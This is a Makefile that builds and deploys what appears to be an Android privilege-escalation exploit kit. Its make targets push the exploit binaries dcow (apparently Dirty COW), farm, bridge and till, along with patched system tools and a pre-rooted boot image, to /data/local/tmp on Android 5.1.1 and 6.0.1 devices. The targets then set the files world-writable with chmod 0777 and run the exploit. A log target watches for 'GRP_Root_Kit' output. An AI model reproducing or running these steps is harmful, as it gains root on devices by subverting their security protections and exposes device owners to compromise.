ARCH := $(shell adb shell getprop ro.product.cpu.abi)
SDK_VERSION := $(shell adb shell getprop ro.build.version.sdk)

all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)

log: 
	adb logcat | grep -a GRP_Root_Kit
##Android 5.11 r2
run5: build
		## we have powerful system_server + install_recovery root commands see the readme
		# this is standard use, see the Android 6.01 section for more examples
		adb push cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android_5.1.1_r2 /data/local/tmp/toolbox
		adb push applypatch_android-5.11_r2 /data/local/tmp/till
		adb push libs/$(ARCH)/dcow /data/local/tmp/dcow				
		adb shell chmod 0777 /data/local/tmp/dcow
		adb push libs/$(ARCH)/farm /data/local/tmp/farm
#------------- if you don't need applypatch use till which runs the exploit only, no apply patch
#			   till exits without harm for subsequent calls		
#		uncomment the following line to completely disable applypatch during exploit
#		adb push libs/$(ARCH)/till /data/local/tmp/till
#		BUT make sure to comment out following line containing 'toolbox_android-5.1.1_r2'
		adb push toolbox_android-5.1.1_r2 /data/local/tmp/till
		#adb push libs/$(ARCH)/till /data/local/tmp/till		
##---------------------------------------------------------------------------------- the remaining parts remain unchanged
		adb push libs/$(ARCH)/bridge /data/local/tmp/bridge
		adb shell chmod 0777 /data/local/tmp/bridge /data/local/tmp/till /data/local/tmp/farm /data/local/tmp/toolbox
		adb shell /data/local/tmp/farm autoremove

##Android 6.01 r1
run6: build
## su install isn't working with locked bootloaders stil, partial working example only 

		adb push boot_img_extracted_and_prerooted_/ /data/local/tmp/
		adb push boot_push.img /data/local/tmp/		
		adb shell chmod -R 0777 /data/local/tmp/boot_img_extracted_and_prerooted_/*
##---------------------------------------------------------------------------------- the remaining parts remain unchanged
		adb push applypatch_android_6.01_r1 /data/local/tmp/till
		#adb push libs/$(ARCH)/till /data/local/tmp/till		
		adb push cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android_6.01_r1 /data/local/tmp/toolbox #precompile aosp toolbox must match your device
		adb push libs/$(ARCH)/dcow /data/local/tmp/dcow				
		adb shell chmod 0777 /data/local/tmp/dcow
		adb push libs/$(ARCH)/farm /data/local/tmp/farm
		adb push libs/$(ARCH)/bridge /data/local/tmp/bridge
		adb shell chmod 0777 /data/local/tmp/bridge /data/local/tmp/till /data/local/tmp/farm /data/local/tmp/toolbox
		adb shell /data/local/tmp/farm

clean:
	rm -rf libs
	rm -rf obj

